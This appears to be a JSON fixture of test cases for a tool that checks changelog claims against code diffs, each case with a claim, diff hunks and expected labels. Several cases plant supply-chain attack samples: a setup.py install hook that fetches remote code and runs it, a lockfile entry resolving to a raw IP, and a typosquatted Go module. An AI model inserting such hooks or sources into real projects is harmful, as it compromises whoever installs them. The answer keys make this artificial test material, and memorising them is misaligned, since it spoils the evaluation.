[
  {
    "name": "toctou-atomic-update",
    "section": "Security Fixes",
    "claim": "Send Access-Count Bypass (Medium, 5.3)",
    "hunks": [
      {
        "path": "src/db/models/send.rs",
        "hunk": "@@ -210,8 +210,14 @@ impl Send {\n-    pub async fn increment_access(&mut self, conn: &DbConn) -> EmptyResult {\n-        self.access_count += 1;\n-        self.save(conn).await\n+    pub async fn register_access(uuid: &str, conn: &DbConn) -> Result<bool, Error> {\n+        // The check and the increment are a single statement, otherwise\n+        // concurrent accesses can both pass the check and exceed the limit.\n+        let updated = diesel::update(sends::table.filter(sends::uuid.eq(uuid))\n+            .filter(sends::max_access_count.is_null()\n+                .or(sends::access_count.lt(sends::max_access_count))))\n+            .set(sends::access_count.eq(sends::access_count + 1))\n+            .execute(conn).await?;\n+        Ok(updated == 1)\n     }"
      }
    ],
    "expected": ["verified"]
  },
  {
    "name": "authz-check-tightened",
    "section": "Security Fixes",
    "claim": "Cross-Organization Cipher Access (Medium, 5.9)",
    "hunks": [
      {
        "path": "src/api/core/ciphers.rs",
        "hunk": "@@ -480,7 +480,9 @@ async fn move_cipher_to_org(data: MoveData, headers: Headers, conn: DbConn) -> EmptyResult {\n-    if shared_to_collections.is_some() {\n+    // An empty collection list would skip the write-access validation below,\n+    // allowing a cipher to be moved into a foreign organization.\n+    if shared_to_collections.as_ref().is_some_and(|cols| !cols.is_empty()) {\n         validate_collection_write_access(&headers.user, &cols, &conn).await?;\n     }"
      }
    ],
    "expected": ["verified"]
  },
  {
    "name": "refactor-only-vs-security-claim",
    "section": "Security Fixes",
    "claim": "SSRF via the icon endpoint (Medium, 5.8)",
    "hunks": [
      {
        "path": "src/api/icons.rs",
        "hunk": "@@ -55,9 +55,7 @@ fn parse_icon_url(domain: &str) -> Result<Url, Error> {\n-    let url = match Url::parse(&format!(\"https://{}\", domain)) {\n-        Ok(u) => u,\n-        Err(e) => return Err(e.into()),\n-    };\n+    let url = Url::parse(&format!(\"https://{}\", domain))?;\n     let host = url.host_str().map(str::to_owned);"
      }
    ],
    "expected": ["no-evidence", "partial"]
  },
  {
    "name": "endpoint-still-present-vs-removal-claim",
    "section": "What's Changed",
    "claim": "The icon endpoint was removed entirely in this release",
    "hunks": [
      {
        "path": "src/api/icons.rs",
        "hunk": "@@ -20,8 +20,8 @@ pub fn routes() -> Vec<Route> {\n-    match CONFIG.icon_service() {\n-        IconService::Internal => routes![icon_internal],\n-        _ => routes![icon_external],\n-    }\n+    if CONFIG.icon_service() == IconService::Internal {\n+        routes![icon_internal]\n+    } else {\n+        routes![icon_external]\n+    }\n }"
      }
    ],
    "expected": ["contradicted"]
  },
  {
    "name": "fabricated-feature-vs-unrelated-migration",
    "section": "What's Changed",
    "claim": "Add native PostgreSQL 18 support with automatic migration",
    "hunks": [
      {
        "path": "migrations/postgresql/2026-05-05-120000_sso_auth_error/up.sql",
        "hunk": "@@ -0,0 +1,2 @@\n+ALTER TABLE sso_auth\n+ADD COLUMN code_response_error TEXT;"
      },
      {
        "path": "Cargo.toml",
        "hunk": "@@ -40,2 +40,2 @@ [dependencies]\n-tokio = \"1.52.1\"\n+tokio = \"1.52.3\""
      }
    ],
    "expected": ["no-evidence"]
  },
  {
    "name": "rate-limit-config-vs-flood-claim",
    "section": "Security Fixes",
    "claim": "Unauthenticated WebSocket Flooding DDOS (Medium, 5.3)",
    "hunks": [
      {
        "path": ".env.template",
        "hunk": "@@ -120,0 +121,4 @@\n+## Rate limiting for unauthenticated endpoints\n+# UNAUTHENTICATED_RATELIMIT_SECONDS=60\n+# UNAUTHENTICATED_RATELIMIT_MAX_BURST=15"
      },
      {
        "path": "src/api/core/sends.rs",
        "hunk": "@@ -310,6 +310,8 @@ async fn post_access(access_id: &str, conn: DbConn, ip: ClientIp) -> JsonResult {\n+    crate::ratelimit::check_limit_unauthenticated(&ip)?;\n+\n     let Some(send) = Send::find_by_access_id(access_id, &conn).await else {"
      }
    ],
    "expected": ["verified", "partial"]
  },
  {
    "name": "skip-invalid-paths",
    "section": "Details",
    "claim": "Skip inaccessible backup source paths: a path that could not be accessed was kept and produced an empty snapshot. Restic now skips any such path and aborts if none remain.",
    "hunks": [
      {
        "path": "cmd/restic/cmd_backup.go",
        "hunk": "@@ -404,12 +404,16 @@ func collectTargets(opts BackupOptions, args []string) (targets []string, err error) {\n-        if _, err := fs.Lstat(target); errors.Is(err, os.ErrNotExist) {\n-            continue\n+        if _, err := fs.Lstat(target); err != nil {\n+            Warnf(\"skipping %v: %v\\n\", target, err)\n+            continue\n         }\n         targets = append(targets, target)\n     }\n+    if len(targets) == 0 {\n+        return nil, errors.New(\"all source paths are inaccessible\")\n+    }\n     return targets, nil"
      }
    ],
    "expected": ["verified"]
  },
  {
    "name": "version-bump-vs-feature-claim",
    "section": "What's Changed",
    "claim": "Added a brand new S3-compatible storage backend",
    "hunks": [
      {
        "path": "Cargo.toml",
        "hunk": "@@ -33,1 +33,1 @@ [dependencies]\n-serde = \"1.0.219\"\n+serde = \"1.0.221\""
      }
    ],
    "expected": ["no-evidence"]
  },
  {
    "name": "disabled-by-default-claim-vs-enabled-default",
    "section": "What's Changed",
    "claim": "Anonymous usage metrics are opt-in and disabled by default",
    "hunks": [
      {
        "path": "config/defaults.go",
        "hunk": "@@ -88,6 +88,8 @@ func defaultConfig() *Config {\n     cfg.LogLevel = \"info\"\n+    // Send anonymous usage metrics unless the operator opts out.\n+    cfg.MetricsReporting = true\n     cfg.DNSOverride = false"
      },
      {
        "path": "docs/metrics.md",
        "hunk": "@@ -1,3 +1,5 @@\n # Metrics\n+\n+Set `metrics_reporting: false` to disable reporting."
      }
    ],
    "expected": ["contradicted"]
  },
  {
    "name": "version-claim-vs-actual-bump",
    "section": "Security",
    "claim": "Updates bundled OpenSSL to 3.5.2 to address CVE-2026-4207",
    "hunks": [
      {
        "path": "deps/openssl/version.cmake",
        "hunk": "@@ -1,2 +1,2 @@\n-set(OPENSSL_VERSION \"3.4.0\")\n+set(OPENSSL_VERSION \"3.4.1\")"
      }
    ],
    "expected": ["contradicted"]
  },
  {
    "name": "removal-claim-vs-deprecation-only",
    "section": "Breaking Changes",
    "claim": "The legacy v1 HTTP API has been removed",
    "hunks": [
      {
        "path": "server/api_v1.go",
        "hunk": "@@ -20,6 +20,9 @@ func registerV1Routes(mux *http.ServeMux) {\n+    // Deprecated: v1 will be removed in a future release.\n+    log.Warn(\"the v1 API is deprecated and will be removed in a future release\")\n     mux.HandleFunc(\"/v1/nodes\", handleNodes)\n     mux.HandleFunc(\"/v1/routes\", handleRoutes)"
      }
    ],
    "expected": ["contradicted"]
  },
  {
    "name": "js-lockfile-nonregistry-source",
    "section": "What's Changed",
    "claim": "chore: routine dependency updates from the npm registry",
    "hunks": [
      {
        "path": "package-lock.json",
        "hunk": "@@ -1041,9 +1041,9 @@\n     \"node_modules/color-convert\": {\n-      \"version\": \"2.0.1\",\n-      \"resolved\": \"https://registry.npmjs.org/color-convert/-/color-convert-2.0.1.tgz\",\n-      \"integrity\": \"sha512-RRECPsj7iu/xb5oKYcsFHSppFNnsj/52OVTRKb4zP5onXwVF3zVmmToNcOfGC+CRDpfK/U584fMg38ZHCaElKQ==\",\n+      \"version\": \"2.0.2\",\n+      \"resolved\": \"http://198.51.100.23:8080/pkgs/color-convert-2.0.2.tgz\",\n+      \"integrity\": \"sha512-9O0kQmXh3AeeTf6dcCK9r1M2QpKwS3jZihxGjZUAYIQEqhtQrqk1I0PPBjMgLYPUjMDzop5NyPKZ2VRMPtHGXg==\","
      }
    ],
    "expected": ["contradicted"]
  },
  {
    "name": "setup-py-install-hook-vs-cleanup-claim",
    "section": "What's Changed",
    "claim": "Packaging cleanup in setup.py",
    "hunks": [
      {
        "path": "setup.py",
        "hunk": "@@ -8,6 +8,16 @@ from setuptools import setup\n+from setuptools.command.install import install\n+import urllib.request, subprocess\n+\n+class PostInstall(install):\n+    def run(self):\n+        install.run(self)\n+        code = urllib.request.urlopen(\"https://paste.example-cdn.net/raw/8fq2\").read()\n+        subprocess.run([\"python\", \"-c\", code], check=False)\n+\n setup(\n     name=\"toolkit\",\n+    cmdclass={\"install\": PostInstall},"
      }
    ],
    "expected": ["contradicted", "no-evidence"]
  },
  {
    "name": "go-module-source-rename-vs-update-claim",
    "section": "What's Changed",
    "claim": "Update dependencies to their latest upstream versions",
    "hunks": [
      {
        "path": "go.mod",
        "hunk": "@@ -12,3 +12,3 @@ require (\n-\tgithub.com/hashicorp/go-retryablehttp v0.7.7\n+\tgithub.com/hashicorq/go-retryablehttp v0.7.7\n \tgolang.org/x/crypto v0.31.0"
      },
      {
        "path": "internal/client/http.go",
        "hunk": "@@ -5,3 +5,3 @@ import (\n-\t\"github.com/hashicorp/go-retryablehttp\"\n+\t\"github.com/hashicorq/go-retryablehttp\"\n )"
      }
    ],
    "expected": ["contradicted", "no-evidence"]
  },
  {
    "name": "docs-only-claim-with-docs-hunk",
    "section": "Details",
    "claim": "Documentation: clarify how restore handles Windows path separators",
    "hunks": [
      {
        "path": "doc/050_restore.rst",
        "hunk": "@@ -140,4 +140,12 @@ Restoring from a snapshot\n+On Windows, target paths may use either forward or backward slashes;\n+``restic restore`` normalizes them before matching. For example::\n+\n+    restic restore latest --target C:\\restored --include /home/user/file.txt"
      }
    ],
    "expected": ["verified"]
  },
  {
    "name": "docs-claim-vs-code-only-hunks",
    "section": "What's Changed",
    "claim": "Improved the troubleshooting guide with new sections on connection errors",
    "hunks": [
      {
        "path": "internal/backend/retry.go",
        "hunk": "@@ -61,7 +61,9 @@ func (be *Backend) retry(ctx context.Context, op func() error) error {\n-    if err != nil {\n+    if err != nil && !errors.Is(err, context.Canceled) {\n         be.report(err)\n+        time.Sleep(be.delay)\n     }"
      }
    ],
    "expected": ["no-evidence"]
  },
  {
    "name": "fix-reverted-later-in-range",
    "section": "Bug Fixes",
    "claim": "Fixed a crash when the config file is empty",
    "hunks": [
      {
        "path": "internal/config/load.go",
        "hunk": "@@ -30,6 +30,9 @@ func Load(path string) (*Config, error) {\n     data, err := os.ReadFile(path)\n+    if len(data) == 0 {\n+        return DefaultConfig(), nil\n+    }\n     return parse(data)"
      },
      {
        "path": "internal/config/load.go",
        "hunk": "@@ -30,9 +30,6 @@ func Load(path string) (*Config, error) {\n     data, err := os.ReadFile(path)\n-    // Revert \"config: return defaults for empty files\" — broke validation.\n-    if len(data) == 0 {\n-        return DefaultConfig(), nil\n-    }\n     return parse(data)"
      }
    ],
    "expected": ["contradicted", "no-evidence"]
  },
  {
    "name": "legit-need-more-files",
    "section": "Bug Fixes",
    "claim": "Fix race condition in session cleanup: internal/session/cleanup.go now takes the registry lock before pruning expired entries",
    "hunks": [
      {
        "path": "CHANGELOG.md",
        "hunk": "@@ -1,2 +1,4 @@\n # Changelog\n+\n+- Fix race condition in session cleanup"
      },
      {
        "path": "internal/version/version.go",
        "hunk": "@@ -1,3 +1,3 @@ package version\n-const Version = \"1.8.3\"\n+const Version = \"1.8.4\""
      }
    ],
    "allPaths": ["CHANGELOG.md", "internal/session/cleanup.go", "internal/session/registry.go", "internal/version/version.go"],
    "expected": ["need"]
  },
  {
    "name": "partial-fix-vs-total-claim",
    "section": "Bug Fixes",
    "claim": "Fixed all memory leaks in the render loop",
    "hunks": [
      {
        "path": "src/render/loop.c",
        "hunk": "@@ -204,6 +204,7 @@ static void render_frame(struct ctx *ctx) {\n     struct framebuf *fb = framebuf_acquire(ctx);\n     draw_scene(ctx, fb);\n+    framebuf_release(fb);\n     present(ctx, fb);\n }\n /* TODO: texture cache still grows unboundedly across scene changes */"
      }
    ],
    "expected": ["partial", "contradicted"]
  },
  {
    "name": "issue-anchored-cherry-pick-fix",
    "section": "Details",
    "claim": "Prevent crash in mountpoint validation if the mountpoint is inaccessible: restic no longer panics when stat on the mountpoint fails",
    "hunks": [
      {
        "path": "cmd/restic/cmd_mount.go",
        "hunk": "@@ -120,8 +120,11 @@ func validateMountpoint(path string) error {\n-    fi, err := os.Stat(path)\n-    if !fi.IsDir() {\n+    fi, err := os.Stat(path)\n+    if err != nil {\n+        return errors.Fatalf(\"unable to access mountpoint %v: %v\", path, err)\n+    }\n+    if !fi.IsDir() {\n         return errors.Fatal(\"mountpoint is not a directory\")\n     }"
      }
    ],
    "expected": ["verified"]
  },
  {
    "name": "behaviour-claim-vs-sourceless-diff",
    "section": "What's changed",
    "claim": "Bug fixes and reliability improvements",
    "hunks": [
      {
        "path": "CHANGELOG.md",
        "hunk": "@@ -1,5 +1,9 @@\n # Changelog\n \n+## 2.1.220\n+\n+- Bug fixes and reliability improvements\n+\n ## 2.1.219\n"
      },
      {
        "path": "feed.xml",
        "hunk": "@@ -8,6 +8,11 @@\n   <title>Releases</title>\n+  <entry>\n+    <id>2.1.220</id>\n+    <title>2.1.220</title>\n+    <summary>Bug fixes and reliability improvements</summary>\n+  </entry>\n   <entry>\n"
      }
    ],
    "expected": ["no-evidence"]
  }
]
